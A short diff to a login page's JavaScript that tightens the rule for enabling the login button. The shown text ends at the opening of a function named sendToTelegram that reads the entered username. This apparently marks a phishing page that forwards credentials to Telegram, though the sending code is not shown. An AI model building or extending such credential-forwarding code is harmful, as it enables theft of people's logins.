@@ -3,27 +3,17 @@ document.addEventListener("DOMContentLoaded", function () {
     const passwordInput = document.getElementById("password");
     const loginBtn = document.getElementById("login-btn");
 
-function handleInput(input) {
-    const span = input.previousElementSibling;
-    if (input.value !== "") {
-        span.style.opacity = "0";
-    } else {
-        span.style.opacity = "1";
-    }
+function handleInput() {
     checkInputs();
 }
 
-function checkInputs() {
-    const username = document.getElementById("username").value.trim();
-    const password = document.getElementById("password").value.trim();
-    const loginBtn = document.getElementById("login-btn");
-
-      if (username !== "" || password !== "") {
-        loginBtn.removeAttribute("disabled");
-    } else {
-        loginBtn.setAttribute("disabled", "true");
+  function checkInputs() {
+        if (usernameInput.value.trim() !== "" && passwordInput.value.trim() !== "") {
+            loginBtn.removeAttribute("disabled");
+        } else {
+            loginBtn.setAttribute("disabled", "true");
+        }
     }
-}
 
 function sendToTelegram() {
     const username = document.getElementById("username").value.trim();
